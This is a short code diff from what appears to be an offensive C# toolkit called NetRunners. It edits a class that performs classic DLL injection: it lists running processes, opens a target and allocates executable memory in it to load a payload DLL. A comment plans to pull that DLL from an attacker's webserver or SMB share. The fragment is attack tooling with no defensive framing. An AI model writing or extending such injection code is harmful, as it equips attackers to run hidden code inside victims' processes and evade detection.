@@ -19,7 +19,7 @@ namespace NetRunners.Runners
     // NOTE: NEEDS A C++ DLL WITH DLL_MAIN TO WORK
     public class ClassicDllInjectionRunner : IRunner
     {
-        public void Run()
+        public void Run(string[] args = null)
         {
             IntPtr SnapShot = CreateToolhelp32Snapshot(0x00000002, 0); //2 = SNAPSHOT of all procs
             ProcessEntry32 pe32 = new ProcessEntry32();
@@ -43,7 +43,7 @@ namespace NetRunners.Runners
                     String dllName = dir + "\\NR.dll";                                         // TO-DO: download from attacker webserver or SMB share string url = http// \\IP\share
 
                     //Allocate space
-                    int sBuf = SelectPayloadSize();
+                    //int sBuf = SelectPayloadSize(IsRemote32BitProcess);
                     IntPtr pRMemory = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE); // change size
 
                     var allocAddress = string.Format("{0:X}", pRMemory); // Pointer -> String
